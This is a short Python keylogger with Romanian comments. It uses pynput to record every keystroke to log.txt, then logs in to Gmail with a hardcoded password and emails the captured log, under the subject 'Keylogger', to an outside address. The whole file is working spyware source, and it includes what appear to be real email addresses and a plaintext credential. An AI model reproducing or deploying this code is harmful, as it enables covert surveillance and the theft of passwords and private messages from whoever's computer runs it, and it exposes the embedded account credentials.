import email
import smtplib
import sys
from email import encoders
from email.message import EmailMessage
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

import pynput

from pynput.keyboard import Key, Listener

c = 0
cont_scriere = 0
taste = []


def apasare(key):
    global c,taste,cont_scriere
    taste.append(key)
    c += 1
    #print("Ai apasat {0}".format(key))
    if c >= 100:
        c = 0
        cont_scriere += 1
        file_w(taste,cont_scriere)
        taste = []



def file_w( taste, cont_scriere ):
    email_user = 'sirpepethesecond@gmail.com'
    email_send = 'srit.hunter@gmail.com'
    with open("log.txt",'a') as f:
        for tasta in taste:
            t = str(tasta).replace("'", "")
            if t.find("space") > 0:
                f.write(' ' )

            elif t.find("enter") > 0:
                f.write('\n' )

            elif t.find("Key") == -1:
                f.write(t )
        if cont_scriere % 100 == 0:
            email_user = 'EMAIL_TRIMITATOR'
            email_send = 'srit.hunter@gmail.com'
            smtp_ssl_host = 'smtp.gmail.com'  # smtp.mail.yahoo.com
            smtp_ssl_port = 465
            s = smtplib.SMTP_SSL(smtp_ssl_host, smtp_ssl_port)
            s.login(email_user, '14rcwh14')
            # with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
            #     smtp.login(email_user, '14rcwh14')
            msg = MIMEMultipart()
            msg['Subject'] = 'Keylogger'
            msg['From'] = email_user
            msg['To'] = email_send
            txt = MIMEText('Keylogger data.')
            msg.attach(txt)
            fo = open('log.txt', 'r')
            file = MIMEText(fo.read(), _subtype="extension of file")
            fo.close()
            file.add_header('Content-Disposition', 'attachment', filename='log.txt')
            msg.attach(file)
            s.send_message(msg)


# escape ca sa ies


def rel(key):
    if key == Key.esc:
        return False


with open("log.txt",'w') as f:
    f.write("START " )



with Listener(on_press=apasare, on_release=rel) as listener:
    listener.join()


#email part connection
#


# server=smtplib.SMTP('smtp.gmail.com',587)
# server.starttls()
# server.login(email_user,'14rcwh14')